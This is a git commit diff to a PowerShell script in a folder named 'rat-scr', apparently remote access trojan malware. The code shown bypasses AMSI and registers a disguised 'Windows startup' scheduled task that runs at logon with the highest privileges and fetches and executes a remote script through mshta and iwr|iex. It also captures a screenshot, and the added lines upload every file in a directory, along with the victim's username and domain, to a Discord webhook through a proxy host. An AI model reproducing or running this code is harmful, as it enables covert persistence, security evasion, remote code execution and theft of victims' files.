340275fb5e1278720cb96374d665ef5b2af57bbd
43a1723 <hai1723notgay@gmail.com>
2024-08-19 16:19:53 +0700

    Update main.ps1

--- rat-scr/main.ps1
+++ rat-scr/main.ps1
@@ -4,7 +4,7 @@ $assembly = [System.Reflection.Assembly]::Load($bytes)
 [Bypass]::amsi()
 
 $task_name = "Windows startup"
-$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='a';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force
@@ -30,3 +30,25 @@ Start-Sleep -Milliseconds 500
 $img = [System.Windows.Forms.Clipboard]::GetImage()
 $img.Save('screenshot.png')
 
+$loaderPath = $dir
+$originalWebhook = $webhook
+$customWebhook = $originalWebhook -replace "discord\.com", "webhook.lewisakura.moe"
+$userName = "$env:username"
+$userDomain = "$env:userdomain"
+
+Get-ChildItem -Path $loaderPath | ForEach-Object {
+    $file = $_.FullName
+    $fileName = $_.Name
+
+    $payload = @{
+        "username" = "hai1723 - $userName - $userDomain"
+        "content"  = "File: $fileName"
+    }
+
+    $form = @{
+        "payload_json" = ($payload | ConvertTo-Json)
+        "file1" = Get-Item $file
+    }
+
+    Invoke-RestMethod -Uri $customWebhook -Method Post -Form $form
+}
